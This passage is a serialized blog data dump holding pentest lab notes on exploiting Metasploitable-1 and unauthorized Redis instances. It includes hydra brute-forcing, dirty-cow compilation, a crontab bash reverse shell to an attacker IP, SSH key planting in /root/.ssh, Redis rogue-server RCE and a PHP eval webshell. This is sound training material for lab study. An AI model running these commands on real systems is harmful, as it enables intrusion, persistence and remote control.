\&quot;tomcat:tomcat\&quot;\n \nsearchsploit it...\nCan deploy war to getshell.For convenience ,use msf\n \n \nit&#39;s account \&quot; tomcat55\&quot;.Need privilege escalation.\nfind authoized_keys in /root/.ssh/ ,it&#39;s target&#39;s public key.\nAfter checking, it is found that the OpenSSL version on the target host is within the vulnerability range.\n \nDownload key pairs on the internet,\nuse &#39;grep&#39; command to find the matching public key file\nRemove the suffix name of the public key file to create the corresponding private key file.\n \nUse this private key file to log in to the root user of the target host.&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Reproduction/Metasploitable-1.md&quot;],&quot;digest&quot;:[0,&quot;ed7278b216cd4742&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;!-- more --&gt;\n&lt;blockquote&gt;\n&lt;p&gt;参考教程：\n&lt;a href=\&quot;https://hack1ng4fun.github.io/2020/03/26/%E9%9D%B6%E6%9C%BA-Metasploitable-1/\&quot;&gt;https://hack1ng4fun.github.io/2020/03/26/%E9%9D%B6%E6%9C%BA-Metasploitable-1/&lt;/a&gt;&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;!-- more --&gt;\n&lt;p&gt;扫描端口结果：\nsudo nmap -sV -Pn -T4 -p 1-65535 -O 192.168.124.28&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;h1 id=\&quot;方法1smb漏洞进入\&quot;&gt;方法1：SMB漏洞进入&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#方法1smb漏洞进入\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;查看smb版本:&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;smbmap -H 192.168.124.28&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;get the version of smb: 3.0.20,we have known that smb-3.0.x has a vulnerablity (CVE-2007-2447）.\nThen we can use msf to exploit it.&lt;/p&gt;\n&lt;p&gt;it’s root privilege.&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;h1 id=\&quot;方法2weak-passwordfail\&quot;&gt;方法2：Weak password(FAIL)&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#方法2weak-passwordfail\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;Use smb_enumusers to scan users,then arrage result to file “users”\nmy smb_enumusers didn’t return unexpected result. the result is as follows:&lt;/p&gt;\n&lt;p&gt;Unfortunately,I failed,I don’t know why.I expected future of me to tell myself.\nbrust user of ftp,telnet,ssh,smb,MySQL,PostgreSQL&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;hydra -L users -e nsr ftp://192.168.124.28 -o ftpuser&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;hydra -L users -e nsr ssh://192.168.124.28 -o sshuser&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;hydra -L users -e nsr telnet://192.168.124.28 -o telnetuser&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;hydra -L users -e nsr smb://192.168.124.28 -o smbuser&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;hydra -L users -e nsr mysql://192.168.124.28 -o mysqluser&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;hydra -L users -e nsr postgres://192.168.124.28 -o postgresqluser&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;“-e nsr” means try “n” null password\nuser msfadmin has root privilege.\nsudo -i  change to root user.&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;h1 id=\&quot;method-3cve-2004-2687\&quot;&gt;Method 3:（CVE-2004-2687）&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-3cve-2004-2687\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;There is a weak passwd:root/root in mysql&lt;/p&gt;\n&lt;p&gt;Use nmap for vulnerability scanning:\nnmap —script vuln 192.168.124.28 -p- open\nThe screenshot is as follows:(the picture is so big that I can’t paste it )\n📎扫描结果.txt\nWe find a vulnerability CVE-2004-2687&lt;/p&gt;\n&lt;p&gt;Use msf to exploit it,unfortunately,I failed again.I don’t know why.&lt;/p&gt;\n&lt;p&gt;Exploit failed: A payload has not been selected&lt;/p&gt;\n&lt;p&gt;Next is escalating privilege.\nCheck scheduled tasks:&lt;/p&gt;\n&lt;p&gt;All scripts are running with root privilege and have no “write” privilege.\nFor convenience,I transform shell to “meterpreter shell”&lt;/p&gt;\n&lt;p&gt;Use kernel vulnerability to escalate privilege.\nI am counting on “dirty-cow” .\nupload /home/kali/Desktop/dirty.c /var/spool/cron&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;shell&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;gcc -pthread dirty.c -lcrypt -o dirty&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chmod +x dirty&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./dirty fly&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Then I get an account “firefart:fly”&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;h1 id=\&quot;method-4\&quot;&gt;Method 4:&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-4\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;The target’s port 80 is open,scan its directory&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dirb http://192.168.124.28 /usr/share/wordlists/dirb/big.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;find a url : &lt;a href=\&quot;http://192.168.124.28/tikiwiki/\&quot;&gt;http://192.168.124.28/tikiwiki/&lt;/a&gt;\ntry admin:admin to login(I have change password from admin to 123456 now)\nUse msf to exploit it again&lt;/p&gt;\n&lt;p&gt;It’s account:“ww-data”\nUse CVE-2009-1185 to escalate privilege.&lt;/p&gt;\n&lt;p&gt;Now,it’s accont “firefart’,because I have used dirty-cow in method3&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;h1 id=\&quot;method-5\&quot;&gt;Method 5:&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-5\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;I have find port 8180 in nmap result,\nIt’s a website based on tomcat.Login it depend on weak password “tomcat:tomcat”&lt;/p&gt;\n&lt;p&gt;searchsploit it…\nCan deploy war to getshell.For convenience ,use msf&lt;/p&gt;\n&lt;p&gt;it’s account ” tomcat55”.Need privilege escalation.\nfind authoized_keys in /root/.ssh/ ,it’s target’s public key.\nAfter checking, it is found that the OpenSSL version on the target host is within the vulnerability range.&lt;/p&gt;\n&lt;p&gt;Download key pairs on the internet,\nuse ‘grep’ command to find the matching public key file\nRemove the suffix name of the public key file to create the corresponding private key file.&lt;/p&gt;\n&lt;p&gt;Use this private key file to log in to the root user of the target host.&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;方法1smb漏洞进入&quot;],&quot;text&quot;:[0,&quot;方法1：SMB漏洞进入&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;方法2weak-passwordfail&quot;],&quot;text&quot;:[0,&quot;方法2：Weak password(FAIL)&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-3cve-2004-2687&quot;],&quot;text&quot;:[0,&quot;Method 3:（CVE-2004-2687）&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-4&quot;],&quot;text&quot;:[0,&quot;Method 4:&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-5&quot;],&quot;text&quot;:[0,&quot;Method 5:&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Metasploitable-1&quot;],&quot;date&quot;:[3,&quot;2023-02-01T03:01:48.000Z&quot;],&quot;categories&quot;:[0,&quot;Reproduction&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/4&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;reproduction/redis未授权访问&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Redis未授权访问&quot;],&quot;date&quot;:[3,&quot;2023-01-18T18:01:48.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;未授权访问&quot;],[0,&quot;Redis&quot;]]],&quot;categories&quot;:[0,&quot;Reproduction&quot;]}],&quot;body&quot;:[0,&quot;[toc]\n\n# 计划任务反弹shell（仅适用于centos）\n如果没有redis-cli,可以用telnet\n在redis以root权限运行时可以写crontab来执行命令反弹shell\nVPS上：\n\n```shell\nnc -lvnp 7999 \n\nredis-cli -h 192.168.124.5\nset xx \&quot;\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.124.4/7999 0&gt;&amp;1\\n\&quot;\nconfig set dir /var/spool/cron/\nconfig set dbfilename root\nsave\n```\n\nvulhub的docker靶机未开crontab服务，所以该方法不适用\n\n补充：redis工具安装\n\n```shell\nwget http://download.redis.io/redis-stable.tar.gz\ntar -zxf redis-stable.tar.gz\n# 进入到 redis-stable 目录\ncd redis-stable\n# 编译\nmake\ncp ./src/redis-cli /usr/bin/\nredis-cli -h\n```\n\n注意任务计划反弹shell方法仅适用于Centos\n\nUbuntu 不能用的原因如下：\n\n因为默认 redis 写文件后是 644 权限，但是 Ubuntu 要求执行定时任务文件 /var/spool/cron/crontabs/&amp;lt;username&amp;gt; 权限必须是 600 才会执行，否则会报错 (root) INSECURE MODE (mode 0600 expected)，而 Centos 的定时任务文件 /var/spool/cron/&amp;lt;username&amp;gt; 权限 644 也可以执行  \n因为 redis 保存 RDB 会存在乱码，在 Ubuntu 上会报错，而在 Centos 上不会报错  \n由于系统的不同，crontrab 定时文件位置也不同：\n\nCentos 的定时任务文件在 /var/spool/cron/&amp;lt;username&amp;gt;  \nUbuntu 的定时任务文件在 /var/spool/cron/crontabs/&amp;lt;username&amp;gt;\n\n# ssh-key公钥登录服务器\n\n在攻击方生成一对ssh key\n\n`ssh-keygen -t rsa`\n\n将生成的公钥植入目标服务器\n\n```shell\n(echo -e \&quot;\\n\\n\&quot;; cat ~/.ssh/id_rsa.pub; echo -e \&quot;\\n\\n\&quot;) &gt; /tmp/foo.txt\ncat /tmp/foo.txt | redis-cli -h 192.168.124.5 -p 6379 -x set crackit\n```\n\n连接目标,设置redis配置文件\n\n```shell\nredis-cli -h 192.168.124.5\nconfig set dir /root/.ssh/\nconfig get dir\nconfig set dbfilename \&quot;authorized_keys\&quot;\nsave\n```\n\n利用私钥连接目标\n\n`ssh root@192.168.124.5 -i ~/.ssh/id_rsa`\n\n不适用于vulhub靶场\n\n# 利用主从复制rce\n\n## 方法一：利用脚本\n\n&gt; https://github.com/n0b0dyCN/redis-rogue-server\n\n```shell\nnc -lvvp 9999\n./redis-rogue-server.py --rhost 192.168.124.5 --lhost 192.168.124.4\n```\n\n后面选反弹shell\n\n![](img/25.PNG)\n## 方法二：手动执行(操作失败)脚本文件\n\n```shell\nredis-cli -h 192.168.124.5\n&gt; ping\n&gt; config set dir ./ # 设置redis的备份路径为当前目录\n&gt; config set dbfilename exp.so # 设置备份文件名为exp.so，默认为dump.rdb\n&gt; slaveof 192.168.10.1 9999 # 设置主服务器IP和端口\n&gt; module load ./exp.so # 加载恶意模块\n&gt; slaveof no one # 切断主从，关闭复制功能\n&gt; system.exec &#39;whoami&#39; # 执行系统命令\n&gt; config set dbfilename dump.rdb # 通过dump.rdb文件恢复数据\n&gt; system.exec &#39;rm ./exp.so&#39; # 删除exp.so\n&gt; module unload system # 卸载system模块的加载\n```\n\n# redis写webshell\n\n靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证2.开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限（我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a/b的任意文件。）\n\n这里由于本地搭建，我们已经知道目录，我们把shell写入/home/bmjoker/目录下：\n\n```shell\nconfig set dir /home/bmjoker\nconfig set dbfilename redis.php\nset x \&quot;\\r\\n\\r\\n&lt;?php phpinfo();?&gt;\\r\\n\\r\\n\&quot;\nsave\n```\n\n当数据库过大时，redis写shell的小技巧：\n\n```php\n&lt;?php set_time_limit(0); $fp=fopen(&#39;bmjoker.php&#39;,&#39;w&#39;); fwrite($fp,&#39;&lt;?php @eval($_POST[\\\&quot;bmjoker\\\&quot;]);?&gt;&#39;); exit(); ?&gt;\n```&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Reproduction/Redis未授权访问.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/25.PNG&quot;]]],&quot;digest&quot;:[0,&quot;2aca5d24f9f8eb23&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;p&gt;[toc]&lt;/p&gt;\n&lt;h1 id=\&quot;计划任务反弹shell仅适用于centos\&quot;&gt;计划任务反弹shell（仅适用于centos）&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#计划任务反弹shell仅适用于centos\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;如果没有redis-cli,可以用telnet\n在redis以root权限运行时可以写crontab来执行命令反弹shell\nVPS上：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;shell\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;nc&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; -lvnp&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; 7999 &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;redis-cli&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; -h&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; 192.168.124.5&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;set&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; xx&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; \&quot;\\n* * * * * bash -i &gt;&amp;#x26; /dev/tcp/192.168.124.4/7999 0&gt;&amp;#x26;1\\n\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;config&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; set&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; dir&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; /var/spool/cron/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;config&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; set&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; dbfilename&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; root&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;save&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;vulhub的docker靶机未开crontab服务，所以该方法不适用&lt;/p&gt;\n&lt;p&gt;补充：redis工具安装&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;shell\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;wget&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; http://download.redis.io/redis-stable.tar.gz&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;tar&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; -zxf&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; redis-stable.tar.gz&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6A737D;--shiki-dark:#6A737D\&quot;&gt;# 进入到 redis-stable 目录&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;cd&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; redis-stable&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6A737D;--shiki-dark:#6A737D\&quot;&gt;# 编译&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;make&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;cp&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; ./src/redis-cli&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; /usr/bin/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;redis-cli&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; -h&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;注意任务计划反弹shell方法仅适用于Centos&lt;/p&gt;\n&lt;p&gt;Ubuntu 不能用的原因如下：&lt;/p&gt;\n&lt;p&gt;因为默认 redis 写文件后是 644 权限，但是 Ubuntu 要求执行定时任务文件 /var/spool/cron/crontabs/&amp;#x3C;username&gt; 权限必须是 600 才会执行，否则会报错 (root) INSECURE MODE (mode 0600 expected)，而 Centos 的定时任务文件 /var/spool/cron/&amp;#x3C;username&gt; 权限 644 也可以执行&lt;br&gt;\n因为 redis 保存 RDB 会存在乱码，在 Ubuntu 上会报错，而在 Centos 上不会报错&lt;br&gt;\n由于系统的不同，crontrab 定时文件位置也不同：&lt;/p&gt;\n&lt;p&gt;Centos 的定时任务文件在 /var/spool/cron/&amp;#x3C;username&gt;&lt;br&gt;\nUbuntu 的定时任务文件在 /var/spool/cron/crontabs/&amp;#x3C;username&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;ssh-key公钥登录服务器\&quot;&gt;ssh-key公钥登录服务器&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#ssh-key公钥登录服务器\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;在攻击方生成一对ssh key&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;ssh-keygen -t rsa&lt;/code&gt;&lt;/p&gt;\n&lt;p&gt;将生成的公钥植入目标服务器&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;shell\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;echo&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; -e&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; \&quot;\\n\\n\&quot;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;; &lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;cat&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; ~/.ssh/id_rsa.pub&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;; &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;echo&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; -e&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; \&quot;\\n\\n\&quot;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;) &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;&gt;&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; /tmp/foo.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;cat&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; /tmp/foo.txt&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt; |&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; redis-cli&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; -h&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; 192.168.124.5&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; -p&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; 6379&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; -x&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; set&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; crackit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;连接目标,设置redis配置文件&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;shell\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;redis-cli&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; -h&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; 192.168.124.5&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;config&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; set&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; dir&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; /root/.ssh/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;config&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; get&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; dir&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;config&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; set&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; dbfilename&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; \&quot;authorized_keys\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;save&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;利用私钥连接目标&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;ssh root@192.168.124.5 -i ~/.ssh/id_rsa&lt;/code&gt;&lt;/p&gt;\n&lt;p&gt;不适用于vulhub靶场&lt;/p&gt;\n&lt;h1 id=\&quot;利用主从复制rce\&quot;&gt;利用主从复制rce&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#利用主从复制rce\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;方法一利用脚本\&quot;&gt;方法一：利用脚本&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#方法一利用脚本\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;blockquote&gt;\n&lt;div class=\&quot;link-preview-block not-prose\&quot; data-state=\&quot;success\&quot;&gt;\n  &lt;a 